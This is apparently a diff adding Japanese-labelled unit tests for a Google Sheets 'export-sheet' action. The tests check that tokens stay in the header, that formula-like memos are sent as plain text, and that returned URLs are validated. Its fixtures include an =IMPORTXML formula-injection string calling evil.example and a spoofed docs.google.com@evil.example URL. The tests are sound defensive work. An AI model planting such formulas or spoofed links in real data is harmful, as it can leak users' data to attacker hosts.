@@ -222,3 +222,80 @@ describe('ACTIONS["create-folder"] — 送り方', () => {
     expect(fetchMock).not.toHaveBeenCalled();
   });
 });
+
+describe('ACTIONS["export-sheet"] — 売上の記録を新しいスプレッドシートへ (2026-11-22)', () => {
+  const payload = {
+    title: '売上の記録 (2026-11-22)',
+    columns: ['日付', '販売先', '金額', '注文の数', 'メモ'],
+    rows: [
+      ['2026-11-01', 'Amazon', 12000, 3, null],
+      ['2026-11-02', '楽天市場', 5000, 1, '=IMPORTXML("https://evil.example","//a")'],
+    ],
+  };
+  const created = {
+    spreadsheetId: 's1',
+    spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/s1/edit',
+    properties: { title: '売上の記録 (2026-11-22)' },
+  };
+
+  it('★ sheets.googleapis.com の spreadsheets.create へ POST し、トークンは Authorization だけに載る', async () => {
+    const fetchMock = vi.fn<typeof fetch>().mockResolvedValueOnce(jsonResponse(created));
+    const out = await ACTIONS['export-sheet']!({ token: 'ya29.secret', fetch: fetchMock, payload });
+    expect(out).toStrictEqual({ id: 's1', title: '売上の記録 (2026-11-22)', url: 'https://docs.google.com/spreadsheets/d/s1/edit' });
+
+    const [url, init] = fetchMock.mock.calls[0]! as [string, RequestInit];
+    const parsed = new URL(url);
+    expect(parsed.origin).toBe('https://sheets.googleapis.com');
+    expect(parsed.pathname).toBe('/v4/spreadsheets');
+    expect(parsed.searchParams.get('fields')).toBe('spreadsheetId,spreadsheetUrl,properties.title');
+    expect(url).not.toContain('ya29.secret');
+    expect(init.method).toBe('POST');
+    expect((init.headers as Record<string, string>).Authorization).toBe('Bearer ya29.secret');
+    const body = JSON.parse(String(init.body)) as {
+      properties: { title: string };
+      sheets: { data: { rowData: { values: Record<string, unknown>[] }[] }[] }[];
+    };
+    expect(body.properties.title).toBe('売上の記録 (2026-11-22)');
+    const rowData = body.sheets[0]!.data[0]!.rowData;
+    expect(rowData).toHaveLength(3); // 見出し + 2 行
+    expect(rowData[0]!.values[0]).toStrictEqual({ userEnteredValue: { stringValue: '日付' } });
+    expect(rowData[1]!.values[2]).toStrictEqual({ userEnteredValue: { numberValue: 12000 } });
+    expect(rowData[1]!.values[4]).toStrictEqual({});
+  });
+
+  it('★ = で始まるメモは文字列のまま送る (式として書かない)', async () => {
+    const fetchMock = vi.fn<typeof fetch>().mockResolvedValueOnce(jsonResponse(created));
+    await ACTIONS['export-sheet']!({ token: 't', fetch: fetchMock, payload });
+    const init = fetchMock.mock.calls[0]![1] as RequestInit;
+    expect(String(init.body)).not.toContain('formulaValue');
+    const body = JSON.parse(String(init.body)) as { sheets: { data: { rowData: { values: unknown[] }[] }[] }[] };
+    expect(body.sheets[0]!.data[0]!.rowData[2]!.values[4]).toStrictEqual({
+      userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example","//a")' },
+    });
+  });
+
+  it('失敗したときどのサービスが落ちたか分かる', async () => {
+    const fetchMock = vi.fn<typeof fetch>().mockResolvedValueOnce(new Response('forbidden', { status: 403 }));
+    await expect(ACTIONS['export-sheet']!({ token: 't', fetch: fetchMock, payload })).rejects.toMatchObject({
+      serviceId: 'drive',
+      status: 403,
+    });
+  });
+
+  it('表題が無ければ送らない (理由も添える)', async () => {
+    const fetchMock = vi.fn<typeof fetch>();
+    await expect(
+      ACTIONS['export-sheet']!({ token: 't', fetch: fetchMock, payload: { ...payload, title: '' } }),
+    ).rejects.toThrow('title は必須です');
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it('★ 応答の URL が docs.google.com の https でなければ、押せるリンクとして返さない', async () => {
+    const fetchMock = vi
+      .fn<typeof fetch>()
+      .mockResolvedValueOnce(jsonResponse({ ...created, spreadsheetUrl: 'https://docs.google.com@evil.example/spreadsheets/d/s1' }));
+    await expect(ACTIONS['export-sheet']!({ token: 't', fetch: fetchMock, payload })).rejects.toThrow(
+      'docs.google.com の https ではありません',
+    );
+  });
+});
